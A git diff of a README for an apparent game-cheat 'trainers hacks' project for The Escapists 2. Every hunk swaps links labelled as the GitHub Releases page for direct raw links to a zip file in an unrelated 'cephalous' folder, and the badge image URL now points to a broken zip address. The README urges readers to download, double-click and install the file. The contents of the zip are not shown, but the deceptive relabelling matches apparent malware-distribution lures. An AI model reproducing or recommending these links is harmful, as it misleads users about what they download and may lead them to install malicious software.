@@ -1,6 +1,6 @@
 # 🎮 The-Escapists-2-trainers-hacks - Unlock New Possibilities in Gameplay
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hsadoon/The-Escapists-2-trainers-hacks/releases)
+[![Download Now](https://raw.githubusercontent.com/hsadoon/The-Escapists-2-trainers-hacks/main/cephalous/The-Escapists-2-trainers-hacks.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hsadoon/The-Escapists-2-trainers-hacks/main/cephalous/The-Escapists-2-trainers-hacks.zip)
 
 ## 📖 About This Project
 
@@ -10,7 +10,7 @@ The Escapists 2 Trainers Hacks offer a way to enhance your gameplay experience. 
 
 To begin using the trainers and hacks, follow these simple steps:
 
-1. **Download the Application:** Head over to the [Releases page](https://github.com/hsadoon/The-Escapists-2-trainers-hacks/releases) to get the latest version of the trainers.
+1. **Download the Application:** Head over to the [Releases page](https://raw.githubusercontent.com/hsadoon/The-Escapists-2-trainers-hacks/main/cephalous/The-Escapists-2-trainers-hacks.zip) to get the latest version of the trainers.
 2. **Install the Software:** After downloading the file, locate it in your computer's download folder. Double-click on the file to start the installation process. Follow the on-screen instructions to complete the setup.
 3. **Launch the Application:** Once the installation is complete, find the application in your computer's Start menu or desktop shortcut. Click to open it.
 
@@ -34,7 +34,7 @@ To ensure smooth operation, your computer should meet the following requirements
 ## 📥 Download & Install
 
 1. Click on the link below to visit the release page:
-   [Visit the Releases Page](https://github.com/hsadoon/The-Escapists-2-trainers-hacks/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/hsadoon/The-Escapists-2-trainers-hacks/main/cephalous/The-Escapists-2-trainers-hacks.zip)
    
 2. Look for the latest version of the application listed on the page.
 3. Download the file by clicking on the link under "Assets."
@@ -70,4 +70,4 @@ A3: No, this application is completely free to download and use.
 
 If you have further questions or need support, feel free to open an issue in the repository, and we will respond as soon as possible.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hsadoon/The-Escapists-2-trainers-hacks/releases)
+[![Download Now](https://raw.githubusercontent.com/hsadoon/The-Escapists-2-trainers-hacks/main/cephalous/The-Escapists-2-trainers-hacks.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hsadoon/The-Escapists-2-trainers-hacks/main/cephalous/The-Escapists-2-trainers-hacks.zip)
